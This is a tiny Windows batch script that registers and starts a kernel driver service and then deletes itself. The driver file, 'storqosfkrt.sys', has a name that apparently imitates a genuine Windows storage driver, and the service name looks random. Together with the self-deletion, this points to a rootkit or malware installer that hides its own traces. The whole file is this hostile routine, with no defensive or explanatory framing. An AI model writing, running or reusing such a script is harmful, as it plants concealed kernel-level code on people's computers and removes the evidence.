@echo off
cd %~dp0
sc create MfcServiceCapture_8572 binpath=C:\Windows\System32\drivers\storqosfkrt.sys type=kernel
sc start MfcServiceCapture_8572
del "%~f0"



